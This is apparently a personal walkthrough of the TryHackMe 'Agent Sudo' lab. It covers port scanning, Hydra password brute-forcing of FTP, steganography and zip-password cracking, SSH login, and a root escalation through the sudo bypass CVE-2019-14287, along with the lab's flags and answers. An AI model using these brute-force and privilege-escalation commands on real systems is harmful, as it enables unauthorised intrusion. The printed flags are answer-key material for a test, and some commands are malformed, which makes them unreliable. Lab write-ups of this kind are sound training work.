# TryHackMe - Agent Sudo

## 🛠 Setup

Set an environment variable for the IP to simplify commands:

```bash
export IP=10.10.123.138
```

---

## 📌 Task 2: Enumerate

### 🔍 Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial $IP
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)                            
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                                          
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                 
|_http-title: Annoucement                                                                    
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


**Q. How many open ports?
A. 3

***Q. How you redirect yourself to a secret page?
A. user-agent

Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 

Install the useer agent to chromium
create a new user agent replacing the user agent with "C"

**Results**

```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R
```


**Q. What is the agent name?
A. chris


## 📌 Task 3: Hash cracking and brute-force

**Q. FTP password
A. crystal

Use Hydra since we know the username is `chris`:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt -u ftp://10.10.123.138
```


**Result:**

```
[21][ftp] host: 10.10.123.138   login: chris   password: crystal
```

Log in and download files:

```bash
ftp chris@10.10.123.138 
mget *
```

We get a message that one of the images has stegonography. Let's install stegseek (because it's super fast)

```bash
sudo apt install stegseek
stegseek cute-alien.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"           
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".

**results**
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
Now we have an SSH login for `james`.

```
but first, lets look at cutie.png
stegseek nor steghide support png. instead we'll use binwalk

```bash
binwalk -e cutie.png
```
Extracted a ZIP file.

Crack the zip password using John the Ripper:

```bash
zip2john 8702.zip > zip.john
john zip.john
```
**Results**

```
alien            (8702.zip/To_agentR.txt)     
```

**Q. Zip file password
A. alien
*Read T-AgentR.txt*
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
That was a bit pointless. Anway, we have what we need to answer the questions

**Q. steg password
A. Area51

**Q. Who is the other agent (in full name)?
A. james

**Q. SSH password
A. hackerrules!


## 📌 Task 4: Capture the user flag


**Q. What is the user flag?
A. b03d975e8c92a7c04146cfa7a5a313c7

```bash
ssh james@10.10.123.138
cat user.txt
```

There's the flag and an image. Let's get the image by setting up a web server on our hacked machine

```bash
python3 http.server 1234
In your browser:  
`http://10.10.123.138:1234`
```
Download the image and use Google reverse image search.

**Q. What is the incident of the photo called?
A. Roswell alien autopsy


## 📌 Task 5: Privilege escalation

**Q. CVE number for the escalation 
A. CVE-2019-14287

Check sudo privileges:
```bash
Sudo -l
```
Result:
```
(ALL, !root) /bin/bash
```

a quick google search reveals it's https://www.exploit-db.com/exploits/47502

**Q. What is the root flag?
A. b53a02f55b57d4439e3341834d70c062

Use the exploit:

```bash
sudo -u#-1 /bin/bash
```

**Rooted!**

```bash
cat /root/root.txt
```

**Q. (Bonus) Who is Agent R?
A. DesKel
